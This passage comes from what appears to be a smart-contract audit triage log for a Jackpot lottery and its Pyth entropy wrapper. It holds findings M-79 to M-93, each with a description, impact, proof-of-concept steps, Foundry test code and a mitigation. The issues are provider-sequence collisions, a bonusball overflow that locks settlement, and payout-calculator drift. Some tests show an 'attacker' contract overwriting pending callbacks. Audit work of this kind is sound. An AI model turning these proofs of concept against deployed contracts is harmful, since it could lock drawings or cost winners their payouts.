### Finding Status Justification: ScaledEntropyProvider has mapping(uint64 => PendingRequest), stores callback data under pending[sequence], and entropyCallback ignores the provider parameter. The Pyth V2 interface treats provider and sequence as the request key. After owner provider rotation, a new provider can reuse a sequence and overwrite or mismatch pending data. There is no guard against overwrites or provider mismatch. The path is in in-scope production code and exists today, but requires privileged provider rotation.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
Pyth sequence numbers are provider-scoped, but ScaledEntropyProvider stores pending requests by sequence only and entropyCallback ignores the provider argument. Vulnerable snippets: mapping(uint64 => PendingRequest) private pending; pending[sequence].callback = msg.sender; and function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override { PendingRequest memory req = pending[sequence]; ... }. After setEntropyProvider rotates providers while old requests are pending, a new provider can issue the same sequence number and overwrite the old pending entry, or an old provider fulfillment can satisfy a pending entry intended for the new provider.

## Impact
Randomness callbacks can be delivered to the wrong request context or old pending requests can be overwritten, leading to wrong drawing settlement, request DoS, or replay-like fulfillment across provider domains after normal provider rotation.

## Proof of Concept
1. A request is made through provider A and stored as pending[sequence]. 2. Owner rotates entropyProvider to provider B. 3. A second request through provider B receives the same provider-local sequence and overwrites pending[sequence]. 4. Provider A reveals its old request. 5. entropyCallback looks up pending[sequence] without checking provider and executes the callback/context for provider B's request using provider A's random number, then deletes it.

## Proof of Code
function test_providerScopedSequenceCollision() public { uint64 seq = 7; MockEntropy entropy = new MockEntropy(); ScaledEntropyProvider sep = new ScaledEntropyProvider(address(entropy), providerA); TestCallback cb = new TestCallback(); vm.prank(address(cb)); sep.requestAndCallbackScaledRandomness{value: 1 ether}(200000, oneRequest(), cb.selectorA(), bytes('A')); assertEq(entropy.lastSequence(), seq); vm.prank(owner); sep.setEntropyProvider(providerB); vm.prank(address(cb)); sep.requestAndCallbackScaledRandomness{value: 1 ether}(200000, oneRequest(), cb.selectorB(), bytes('B')); assertEq(entropy.lastSequence(), seq); entropy.fulfill(providerA, seq, bytes32(uint256(123))); assertEq(cb.lastContext(), bytes('B')); assertEq(cb.callsForA(), 0); assertEq(cb.callsForB(), 1); }

## Suggested Mitigation
Key pending requests by both provider and sequence, e.g. mapping(address => mapping(uint64 => PendingRequest)), store the provider with each request, and require the callback provider to match the stored provider before fulfilling and deleting the request. Avoid rotating providers while pending requests exist or add a migration/cancel mechanism.
```

### Current Validated Block
### M-79 / `Eo7DO9DiVWIGLlFfnfy0D`
- Finding Title: Entropy pending requests are keyed only by sequence and collide across provider rotations
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-provider-sequence-collision`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The provider argument supplied by Pyth is ignored even though sequence numbers are provider-local. A provider rotation can therefore cause callback metadata for one request domain to be used for another. For Jackpot, that can misdeliver or lose the request needed to unlock settlement.
- Code Evidence: `contracts/ScaledEntropyProvider.sol::entropyCallback(uint64 sequence, address /*provider*/, ...)` explicitly discards provider and reads `pending[sequence]`; `setEntropyProvider` can be called without draining pending requests.

## M-83 / `eU8MFp1NT2zpXY6vsm4RZ`
- Finding title: Bonusball ranges above the bit-packing boundary can make entropy settlement revert and lock the drawing
- Report lines: 6101-6155

### Original Report Block
```md
## [M-83]. Bonusball ranges above the bit-packing boundary can make entropy settlement revert and lock the drawing

## id: eU8MFp1NT2zpXY6vsm4RZ

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath

## Exploit Type
Dos

## Location
TicketComboTracker.countTierMatchesWithBonusball

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The code does not enforce normalBallMax + bonusballMax <= 255 when initializing a drawing. If a privileged configuration permits an in-range bonusball such that _bonusball + _tracker.normalMax overflows uint8, TicketComboTracker.countTierMatchesWithBonusball reverts during scaledEntropyCallback. Because runJackpot locks the drawing before requesting entropy, a reverting callback can leave normal progression blocked. The finding is in scoped code and no complete safeguard prevents the invalid configured range.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Ticket and winning-number packing place the bonusball at `normalMax + bonusball`, but new drawings do not enforce `ballMax + bonusballMax <= 255`. When entropy returns a valid bonusball whose packed bit index exceeds uint8 arithmetic capacity, `1 << (_bonusball + _tracker.normalMax)` reverts before settlement can complete. Vulnerable snippets: `ticketNumbers = set |= 1 << (_bonusball + _tracker.normalMax);` and `_setNewDrawingState` assigning `newDrawingState.bonusballMax = newBonusball` without bounding it by `MAX_BIT_VECTOR_SIZE - normalBallMax`.

## Impact
A valid entropy result can permanently revert settlement for a locked drawing, blocking jackpot progression and forcing emergency-mode recovery. Users selecting advertised high bonusball values can also be unable to buy those tickets.

## Proof of Concept
1. A drawing is initialized with ballMax=128 and bonusballMax=128, which is not rejected. 2. runJackpot requests a bonusball in [1,128]. 3. Entropy returns bonusball 128, a value within the configured range. 4. countTierMatchesWithBonusball attempts to pack `1 << (128 + 128)`. 5. The callback reverts, leaving jackpotLock=true and currentDrawingId unchanged.

## Proof of Code
// Foundry sketch
function test_bonusballPastPackingBoundaryLocksSettlement() public {
    // setup drawing 1 with ballMax=128 and bonusballMax=128
    configureAndInitializeDrawing(128, 128);
    vm.warp(jackpot.getDrawingState(1).drawingTime + 1);
    jackpot.runJackpot{value: jackpot.getEntropyCallbackFee()}();

    uint256[][] memory nums = new uint256[][](2);
    nums[0] = new uint256[](5);
    nums[0][0] = 1; nums[0][1] = 2; nums[0][2] = 3; nums[0][3] = 4; nums[0][4] = 5;
    nums[1] = new uint256[](1);
    nums[1][0] = 128;

    vm.prank(address(entropy));
    vm.expectRevert();
    jackpot.scaledEntropyCallback(bytes32(uint256(1)), nums, "");

    IJackpot.DrawingState memory s = jackpot.getDrawingState(1);
    assertEq(s.jackpotLock, true);
    assertEq(jackpot.currentDrawingId(), 1);
}

## Suggested Mitigation
Enforce `normalBallMax + bonusballMax <= 255` whenever drawing parameters are set or derived. In `_setNewDrawingState`, cap or revert when `newBonusball > MAX_BIT_VECTOR_SIZE - normalBallMax`; apply the same guard in constructor/admin setters before a drawing can be initialized.
```

### Current Validated Block
### M-83 / `eU8MFp1NT2zpXY6vsm4RZ`
- Finding Title: Bonusball ranges above the bit-packing boundary can make entropy settlement revert and lock the drawing
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `bonusball-settlement-dos`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: This finding correctly focuses on callback reversion. `_setNewDrawingState` can initialize a drawing where some in-range bonusball values cannot be encoded with the normal-ball bit domain. Once `runJackpot` locks the drawing, an entropy result containing such a high bonusball causes `countTierMatchesWithBonusball` to revert, leaving normal settlement unavailable.
- Code Evidence: `contracts/Jackpot.sol::_setNewDrawingState` does not require `uint256(normalBallMax) + uint256(newBonusball) <= 255`. `TicketComboTracker.countTierMatchesWithBonusball` packs the returned bonusball with `_bonusball + _tracker.normalMax` during `Jackpot.scaledEntropyCallback`.

## M-84 / `up_Ag7R-61tUyZTohHm-S`
- Finding title: Changing entropy during a locked drawing permanently rejects the pending callback
- Report lines: 6156-6190

### Original Report Block
```md
## [M-84]. Changing entropy during a locked drawing permanently rejects the pending callback

## id: up_Ag7R-61tUyZTohHm-S

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation

## Exploit Type
GlobalParamMidFlowManipulation

## Location
Jackpot.setEntropy / scaledEntropyCallback

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: runJackpot locks the drawing and requests entropy from the current entropy contract, but no request-time entropy address is stored. setEntropy can change the global entropy address, and onlyEntropy checks the live global address. A valid old callback is therefore rejected after rotation, and the new entropy contract has no pending request. The code path is in in-scope Jackpot production code. No safeguard blocks setEntropy while locked. It requires owner action.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`runJackpot` requests entropy from the current `entropy` contract and then waits for that contract to call `scaledEntropyCallback`. However, `setEntropy` can update the global entropy address while the drawing is locked. The callback authorization uses the live address: `modifier onlyEntropy() { if (msg.sender != address(entropy)) revert JackpotErrors.UnauthorizedEntropyCaller(); _; }`. If governance rotates entropy after `runJackpot` but before fulfillment, the original entropy provider's callback reverts because `msg.sender` is no longer equal to `address(entropy)`. The new entropy contract has no pending request for the locked drawing, so normal settlement cannot complete.

## Impact
A valid entropy rotation during an active request can leave the current drawing locked indefinitely. Ticket claims for that drawing cannot proceed, LP withdrawals depending on settlement remain blocked, and recovery requires emergency mode or another privileged intervention.

## Proof of Concept
1. Drawing N is due and `runJackpot` locks it using entropy provider A. 2. Before A fulfills, the owner calls `setEntropy(B)` intending to rotate future entropy requests. 3. Provider A later calls `scaledEntropyCallback`. 4. `onlyEntropy` compares `msg.sender` to B and reverts. 5. Drawing N remains locked because no successful callback can advance `currentDrawingId`.

## Proof of Code
function test_entropyRotationDuringLockedDrawingRejectsOldCallback() public { JackpotHarness j = deployHarness(); address oldEntropy = address(0xA11CE); address newEntropy = address(0xB0B); j.setEntropy(IScaledEntropyProvider(oldEntropy)); j.setCurrentDrawingId(1); j.setDrawing(1, 1000e6, 10e6, 0, 10, 1, block.timestamp - 1, true); j.setEntropy(IScaledEntropyProvider(newEntropy)); uint256[][] memory randoms = validRandoms(); vm.prank(oldEntropy); vm.expectRevert(JackpotErrors.UnauthorizedEntropyCaller.selector); j.scaledEntropyCallback(bytes32(uint256(1)), randoms, bytes('')); Jackpot.DrawingState memory s = j.getDrawingState(1); assertEq(s.jackpotLock, true); assertEq(j.currentDrawingId(), 1); }

## Suggested Mitigation
Disallow entropy address changes while `drawingState[currentDrawingId].jackpotLock` is true, or snapshot the entropy contract/request source per drawing and authorize the callback from that snapshotted address.
```

### Current Validated Block
### M-84 / `up_Ag7R-61tUyZTohHm-S`
- Finding Title: Changing entropy during a locked drawing permanently rejects the pending callback
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-authority-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: A locked drawing authorizes callbacks against the live global entropy address rather than the request-time source. Changing entropy during the locked window makes the old request's valid callback revert and the new entropy contract has no corresponding request. This can leave the drawing locked until privileged intervention.
- Code Evidence: `contracts/Jackpot.sol::runJackpot` requests randomness through the current `entropy`; `setEntropy` has no lock guard; `onlyEntropy` on `scaledEntropyCallback` checks `msg.sender` against the updated global.

## M-85 / `z6UFaJb3e9UR2WAFVsTsW`
- Finding title: Entropy requests from different providers collide because pending requests are keyed only by sequence
- Report lines: 6191-6225

### Original Report Block
```md
## [M-85]. Entropy requests from different providers collide because pending requests are keyed only by sequence

## id: z6UFaJb3e9UR2WAFVsTsW

## Derived From Pattern/Invariant
StorageCollisionOrSelectorClash

## Exploit Type
StorageLayout

## Location
ScaledEntropyProvider._storePendingRequest

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The ScaledEntropyProvider pending mapping is keyed only by sequence, and _storePendingRequest overwrites that key. entropyCallback ignores the provider supplied by Pyth. Since the Pyth request API is provider-scoped, provider rotations can create overlapping sequence numbers and corrupt pending metadata. There is no provider namespacing or pending overwrite check. This is in-scope production code and currently reachable if the owner rotates providers while requests remain pending.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
Pyth entropy sequence numbers are provider-scoped, but ScaledEntropyProvider stores pending callbacks as `mapping(uint64 => PendingRequest) private pending;`. setEntropyProvider() can switch to a provider whose next sequence number overlaps an old provider's still-pending sequence. A new request then overwrites `pending[sequence]`, replacing the callback, selector, context, and setRequests for the old request. Fulfillment of either provider's request can now use the wrong pending data or make the other request unrecoverable.

## Impact
A normal provider rotation can corrupt in-flight entropy requests, causing jackpot settlement callbacks to be lost, delivered to the wrong callback, or executed with mismatched request parameters. This can lock a drawing or settle with unintended randomness context.

## Proof of Concept
1. Jackpot requests entropy through provider A and receives sequence N; pending[N] points to Jackpot. 2. The ScaledEntropyProvider owner rotates to provider B while A's request is pending. 3. A second request through provider B also receives sequence N because sequences are per provider. 4. _storePendingRequest overwrites pending[N]. 5. When A fulfills, ScaledEntropyProvider loads B's callback data; the original Jackpot request is no longer bound to its fulfillment.

## Proof of Code
function test_providerSequenceCollisionOverwritesPendingRequest() public { MockEntropy entropy = new MockEntropy(); ScaledEntropyProvider p = new ScaledEntropyProvider(address(entropy), providerA); entropy.setNextSequence(providerA, 7); p.requestAndCallbackScaledRandomness{value: 1 ether}(100000, oneRequest(), this.cb.selector, bytes(hex'aaaa')); p.setEntropyProvider(providerB); entropy.setNextSequence(providerB, 7); AttackerCallback attacker = new AttackerCallback(p); attacker.makeRequest{value: 1 ether}(oneRequest()); ScaledEntropyProvider.PendingRequest memory req = p.getPendingRequest(7); assertEq(req.callback, address(attacker)); }

## Suggested Mitigation
Key pending requests by both provider and sequence, for example `mapping(address => mapping(uint64 => PendingRequest))`, and have the entropy callback look up `pending[provider][sequence]`. Prevent provider rotation while requests are pending or maintain a pending request count per provider.
```

### Current Validated Block
### M-85 / `z6UFaJb3e9UR2WAFVsTsW`
- Finding Title: Entropy requests from different providers collide because pending requests are keyed only by sequence
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-provider-sequence-collision`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The pending request key omits provider identity, so provider-local sequence numbers can collide after a provider rotation. Because there is no overwrite protection and callback delivery ignores provider, in-flight Jackpot randomness can be lost or misrouted. The issue is current and material under a normal migration workflow with pending requests.
- Code Evidence: `contracts/ScaledEntropyProvider.sol` has `mapping(uint64 => PendingRequest) private pending`; `_storePendingRequest` overwrites by sequence; `entropyCallback` ignores `provider`.

## M-86 / `VumA1LcRqul120TjtxTRb`
- Finding title: Rotating payoutCalculator after settlement can zero or change unclaimed winning tickets
- Report lines: 6226-6260

### Original Report Block
```md
## [M-86]. Rotating payoutCalculator after settlement can zero or change unclaimed winning tickets

## id: VumA1LcRqul120TjtxTRb

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.claimWinnings / setPayoutCalculator

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: Jackpot stores no payoutCalculatorForDrawing. Settlement uses the current calculator to calculate/store tier payouts, while claimWinnings later reads payoutCalculator.getTierPayout from the live mutable global. setPayoutCalculator can replace it at any time. The root cause is in in-scope production code, and there is no complete safeguard such as snapshotting or migration. It is exploitable when owner/governance rotates the calculator while old winnings remain unclaimed, so it requires a privileged actor.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
Settlement calculates drawingUserWinnings through the payoutCalculator active at callback time, but claims later read the mutable global payoutCalculator again. Vulnerable snippet: uint256 winningAmount = payoutCalculator.getTierPayout(drawingId, tierId);. If governance rotates to a new calculator for future drawings, old unclaimed tickets are priced by the new calculator, which may have no tierPayouts for the old drawing or may use different values. The ticket is burned before this read is paid out, so a winner can permanently lose the claim amount.

## Impact
Winners from already-settled drawings can be underpaid or paid zero after a normal payout calculator rotation. If the new calculator returns larger values, claims can also pay amounts not reserved during settlement, creating accounting insolvency.

## Proof of Concept
1. Drawing d settles using payout calculator A, and A stores nonzero tier payouts. 2. A winning ticket remains unclaimed. 3. Owner rotates payoutCalculator to B for future drawings. 4. The old winner calls claimWinnings. 5. Jackpot burns the ticket and calls B.getTierPayout(d, tierId), which returns zero or an incompatible value instead of A's settled payout.

## Proof of Code
function test_RotatingPayoutCalculatorZerosOldClaim() public { Fixture memory f = _deployInitializedSystem(); uint256 ticketId = _buyTicketThatWillWin(f, alice); _settleDrawingWithTicketAsWinner(f, ticketId); uint256 settledDrawing = f.jackpot.currentDrawingId() - 1; assertGt(f.calcA.getTierPayout(settledDrawing, 11), 0); MockPayoutCalculator calcB = new MockPayoutCalculator(); vm.prank(owner); f.jackpot.setPayoutCalculator(calcB); uint256 balBefore = f.usdc.balanceOf(alice); vm.prank(alice); f.jackpot.claimWinnings(_single(ticketId)); assertEq(f.usdc.balanceOf(alice), balBefore); }

## Suggested Mitigation
Snapshot the payout calculator per drawing, for example mapping(uint256 => IPayoutCalculator) drawingPayoutCalculator, set it when drawing tier info is initialized, and use that snapshot in claimWinnings. Alternatively migrate old payout data before allowing calculator rotation.
```

### Current Validated Block
### M-86 / `VumA1LcRqul120TjtxTRb`
- Finding Title: Rotating payoutCalculator after settlement can zero or change unclaimed winning tickets
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `payout-calculator-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: Settled tier payouts live in whichever calculator was active at settlement, but claims read the live global calculator. Rotating to a new calculator before all winners claim can make historical tickets read zero or incompatible payouts. This violates the expected future-only behavior of payout changes and can burn winning tickets for no payment.
- Code Evidence: `contracts/Jackpot.sol::claimWinnings` burns the ticket and then reads `payoutCalculator.getTierPayout(drawingId, tierId)` from the mutable global. `setPayoutCalculator` does not snapshot per drawing or migrate old payouts.

## M-87 / `dUualzZdMcwOLTWqMmzY9`
- Finding title: Entropy provider rotation lets per-provider sequence collisions overwrite pending jackpot randomness
- Report lines: 6261-6301

### Original Report Block
```md
## [M-87]. Entropy provider rotation lets per-provider sequence collisions overwrite pending jackpot randomness

## id: dUualzZdMcwOLTWqMmzY9

## Derived From Pattern/Invariant
StorageCollisionOrSelectorClash

## Exploit Type
StorageLayout

## Location
ScaledEntropyProvider.requestAndCallbackScaledRandomness / entropyCallback

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: ScaledEntropyProvider uses mapping(uint64 => PendingRequest) and entropyCallback ignores provider, while Pyth V2 request lookup is provider-scoped. _storePendingRequest does not prevent overwriting an existing sequence. A provider rotation is owner-only, but after that a public request can collide with an old provider's sequence and overwrite metadata. The relevant contract is in scope and no provider/sequence composite key exists. This is exploitable in today's code if rotation occurs with pending requests.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
Pending entropy requests are keyed only by `uint64 sequence`: `mapping(uint64 => PendingRequest) private pending;`. Pyth sequence numbers are provider-scoped, and `entropyCallback()` ignores the callback `provider` argument. If the entropy provider is changed while an old jackpot request is pending, a request to the new provider with the same sequence overwrites `pending[sequence]`. The old jackpot request is then lost and the jackpot remains locked.

## Impact
The active jackpot drawing can be permanently stuck after a provider rotation, blocking ticket purchases, LP operations, and drawing progression until emergency recovery.

## Proof of Concept
1. Jackpot requests entropy through provider A and stores `pending[S]` for its callback. 2. The ScaledEntropyProvider owner rotates to provider B for future requests while A's request is pending. 3. An attacker calls `requestAndCallbackScaledRandomness()` through provider B when B returns the same sequence S. 4. `_storePendingRequest()` overwrites the jackpot callback at `pending[S]`. 5. Provider A's fulfillment no longer reaches Jackpot; the drawing stays locked.

## Proof of Code
pragma solidity ^0.8.28;
import {Test} from 'forge-std/Test.sol';
import {ScaledEntropyProvider} from '../contracts/ScaledEntropyProvider.sol';
import {IScaledEntropyProvider} from '../contracts/interfaces/IScaledEntropyProvider.sol';
contract E { mapping(address=>uint64) public next; function setNext(address p,uint64 s) external { next[p]=s; } function getFeeV2(address,uint32) external pure returns(uint128){ return 1; } function requestV2(address p,uint32) external payable returns(uint64 s){ s=next[p]; next[p]=s+1; } }
contract C { function cb(uint64,uint256[][] memory,bytes memory) external {} }
contract EntropyCollisionTest is Test { function testProviderScopedSequenceOverwritesPending() external { address A=address(0xA); address B=address(0xB); E e=new E(); e.setNext(A,42); ScaledEntropyProvider sep=new ScaledEntropyProvider(address(e),A); IScaledEntropyProvider.SetRequest[] memory r=new IScaledEntropyProvider.SetRequest[](1); r[0]=IScaledEntropyProvider.SetRequest(1,1,10,false); C victim=new C(); vm.prank(address(victim)); sep.requestAndCallbackScaledRandomness{value:1}(100000,r,C.cb.selector,''); ScaledEntropyProvider.PendingRequest memory p1=sep.getPendingRequest(42); assertEq(p1.callback,address(victim)); sep.setEntropyProvider(B); e.setNext(B,42); C attacker=new C(); vm.prank(address(attacker)); sep.requestAndCallbackScaledRandomness{value:1}(100000,r,C.cb.selector,''); ScaledEntropyProvider.PendingRequest memory p2=sep.getPendingRequest(42); assertEq(p2.callback,address(attacker)); } }

## Suggested Mitigation
Key pending requests by both provider and sequence, store the provider in `PendingRequest`, and in `entropyCallback()` require that the callback provider matches the stored provider. Also reject overwriting an existing pending request key.
```

### Current Validated Block
### M-87 / `dUualzZdMcwOLTWqMmzY9`
- Finding Title: Entropy provider rotation lets per-provider sequence collisions overwrite pending jackpot randomness
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-provider-sequence-collision`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: After a valid provider rotation, public requests through the new provider can collide with an old provider's pending sequence and replace its callback metadata. If the old sequence belonged to a Jackpot drawing, the callback needed for settlement can be consumed by another requester, leaving the drawing locked. No provider namespace or overwrite guard prevents this.
- Code Evidence: `contracts/ScaledEntropyProvider.sol::requestAndCallbackScaledRandomness` stores by returned `sequence`; `setEntropyProvider` changes the provider without pending counts; `entropyCallback` discards provider.

## M-88 / `SIZoP2wmWR2-DqOorjm21`
- Finding title: Payout calculator rotation can zero or alter unclaimed winnings from already-settled drawings
- Report lines: 6302-6343

### Original Report Block
```md
## [M-88]. Payout calculator rotation can zero or alter unclaimed winnings from already-settled drawings

## id: SIZoP2wmWR2-DqOorjm21

## Derived From Pattern/Invariant
AccountingInvariantViolation: claims for settled drawings must read the payout calculator snapshot used at settlement

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.claimWinnings/setPayoutCalculator

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: scaledEntropyCallback stores tier payouts in the then-current payoutCalculator, but claimWinnings later queries the mutable global payoutCalculator. setPayoutCalculator has no per-drawing snapshot, migration, or lockout for unclaimed tickets. The ticket is burned before transfer, though a transfer revert would revert the burn; if the new calculator returns zero, the burn and zero payout can complete. The issue is in in-scope production code. It requires owner rotation of the calculator, so the privileged-actor flag is true.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`scaledEntropyCallback` calculates and stores a drawing's tier payouts in the then-current `payoutCalculator`, but `claimWinnings` later reads from the mutable global `payoutCalculator`: `uint256 winningAmount = payoutCalculator.getTierPayout(drawingId, tierId);`. If governance rotates `payoutCalculator` for future drawings after a drawing has settled, unclaimed tickets from prior drawings read payouts from the new calculator, which may have no stored payout for the old drawing or different values. The ticket is burned before the USDC transfer, so the user can lose the claim path in the same transaction.

## Impact
Unclaimed winners from already-settled drawings can be underpaid or paid zero after a normal calculator upgrade/rotation. The deducted settlement funds can remain stranded or be misaccounted instead of reaching winners.

## Proof of Concept
1. Drawing d settles using payout calculator A, which stores a nonzero payout for tier t. 2. A winning ticket from drawing d remains unclaimed. 3. Owner calls `setPayoutCalculator(B)` for future drawings. 4. The winner claims. `claimWinnings` burns the NFT and queries B for `(d,t)`, returning zero or a different value. 5. The winner receives less than the settled payout from A.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
interface ICalc { function getTierPayout(uint256,uint256) external view returns (uint256); }
contract CalcA is ICalc { function getTierPayout(uint256 d, uint256 t) external pure returns (uint256) { return d == 1 && t == 11 ? 100e6 : 0; } }
contract CalcB is ICalc { function getTierPayout(uint256, uint256) external pure returns (uint256) { return 0; } }
contract ClaimHarness { ICalc public payoutCalculator; constructor(ICalc c) { payoutCalculator = c; } function setPayoutCalculator(ICalc c) external { payoutCalculator = c; } function claimRead(uint256 d, uint256 t) external view returns (uint256) { return payoutCalculator.getTierPayout(d, t); } }
contract CalculatorRotationTest is Test { function testRotationChangesOldDrawingPayout() public { ClaimHarness h = new ClaimHarness(new CalcA()); assertEq(h.claimRead(1, 11), 100e6); h.setPayoutCalculator(new CalcB()); assertEq(h.claimRead(1, 11), 0); } }

## Suggested Mitigation
Snapshot the calculator per drawing, e.g. `mapping(uint256 => IPayoutCalculator) payoutCalculatorForDrawing`, set it when tier info is initialized or settlement occurs, and use that snapshot in `claimWinnings`. Alternatively store final tier payouts in `Jackpot` itself.
```

### Current Validated Block
### M-88 / `SIZoP2wmWR2-DqOorjm21`
- Finding Title: Payout calculator rotation can zero or alter unclaimed winnings from already-settled drawings
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `payout-calculator-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: Already-settled ticket claims are not bound to the calculator that stored their tier payouts. A later calculator rotation changes the source used by `claimWinnings`, so unclaimed winners can receive zero or different payouts despite the drawing having settled. This is material user fund loss from global pointer drift.
- Code Evidence: `contracts/Jackpot.sol::_calculateDrawingUserWinnings` stores payouts in the active calculator at settlement, while `claimWinnings` later queries the live `payoutCalculator`; `setPayoutCalculator` simply replaces that global pointer.

## M-91 / `GPliAtb0Dot7OjQ4XXxl1`
- Finding title: Payout calculator rotation reprices already initialized or settled ticket claims
- Report lines: 6414-6480

### Original Report Block
```md
## [M-91]. Payout calculator rotation reprices already initialized or settled ticket claims

## id: GPliAtb0Dot7OjQ4XXxl1

## Derived From Pattern/Invariant
BeaconOrFactoryAuthorityDrift: mutable payout calculator address is not snapshotted per drawing

## Exploit Type
BeaconFactoryAuthorityDrift

## Location
Jackpot.setPayoutCalculator / claimWinnings / scaledEntropyCallback

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: Jackpot.setPayoutCalculator updates a single global payoutCalculator. claimWinnings reads payoutCalculator.getTierPayout(drawingId, tierId) for historical tickets, and scaledEntropyCallback also uses the live calculator. There is no per-drawing calculator snapshot in Jackpot. The path is in production scope and no safeguard preserves old payout data. The issue is currently reachable if the owner rotates the calculator while old tickets remain claimable or a drawing is active, so it depends on a privileged governance action but is not speculative.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
The payout calculator is a single mutable global pointer. `setPayoutCalculator` immediately replaces it:

`payoutCalculator = _payoutCalculator;`

Claims for old tickets later read the live calculator instead of the calculator used when the drawing was initialized or settled:

`uint256 winningAmount = payoutCalculator.getTierPayout(drawingId, tierId);`

Likewise, if governance rotates the calculator during an active drawing for future use, `scaledEntropyCallback` calculates the active drawing with the new calculator even though `setDrawingTierInfo(currentDrawingId)` was called on the old calculator when the drawing was initialized. This is not malicious admin behavior; it is a normal upgrade path lacking per-drawing binding/migration.

## Impact
Winners from already settled or active drawings can be underpaid or paid zero if the new calculator has no stored tier payout for the old drawing id. Matured winnings can remain trapped or be redirected into LP accounting instead of paid to ticket holders.

## Proof of Concept
1. Drawing 1 is initialized and/or settled using payout calculator A.
2. A stores tier payout for drawing 1, tier 11 as 1,000 USDC.
3. Before all winning NFTs are claimed, governance rotates `payoutCalculator` to calculator B for future drawings.
4. A drawing 1 winner calls `claimWinnings`.
5. `claimWinnings` reads `B.getTierPayout(1, 11)`, which is zero or unrelated, burns the NFT, and transfers the wrong amount.

## Proof of Code
// Foundry-style regression sketch
function testPayoutCalculatorRotationBreaksOldClaims() public {
    MockPayoutCalculator oldCalc = new MockPayoutCalculator();
    oldCalc.setPayout(1, 11, 1000e6);
    MockPayoutCalculator newCalc = new MockPayoutCalculator();
    newCalc.setPayout(1, 11, 0);

    jackpotHarness.initializeWithPayout(oldCalc);
    jackpotHarness.setClaimState({currentId: 2, ticketDrawingId: 1, referralWinShare: 0, payout: 1000e6});
    ticketNft.setTicket(1, address(this), 1, packedWinningTicket, bytes32(0));
    usdc.mint(address(jackpotHarness), 1000e6);

    jackpotHarness.setPayoutCalculator(newCalc);

    uint256[] memory ids = new uint256[](1);
    ids[0] = 1;
    jackpotHarness.claimWinnings(ids);

    assertEq(usdc.balanceOf(address(this)), 0);
    assertEq(ticketNft.burned(1), true);
}

## Suggested Mitigation
Store `payoutCalculatorForDrawing[drawingId]` when a drawing is initialized and use that address for both settlement and claims. If calculators are rotated, either migrate old drawing payout data or forbid rotation while any initialized/settled drawing still depends on the previous calculator.
```

### Current Validated Block
### M-91 / `GPliAtb0Dot7OjQ4XXxl1`
- Finding Title: Payout calculator rotation reprices already initialized or settled ticket claims
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `payout-calculator-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: Jackpot lacks a per-drawing payout calculator snapshot. Rotation can affect either an active drawing's settlement if the new calculator was not initialized for that drawing, or historical claims if old payouts remain in the prior calculator. Both are material deviations from future-only parameter changes.
- Code Evidence: `contracts/Jackpot.sol::setPayoutCalculator` mutates one global. `_setNewDrawingState` calls `payoutCalculator.setDrawingTierInfo(currentDrawingId)` only on the then-current calculator, and `claimWinnings` reads from the live calculator.

## M-93 / `PR2G588QO-Kwr3c5Fhe4w`
- Finding title: Provider sequence collision can overwrite pending jackpot randomness and leave a drawing permanently locked
- Report lines: 6522-6561

### Original Report Block
```md
## [M-93]. Provider sequence collision can overwrite pending jackpot randomness and leave a drawing permanently locked

## id: PR2G588QO-Kwr3c5Fhe4w

## Derived From Pattern/Invariant
StorageCollisionOrSelectorClash

## Exploit Type
Dos

## Location
ScaledEntropyProvider.requestAndCallbackScaledRandomness/entropyCallback

## Finding Status: InvalidGovernanceRisk
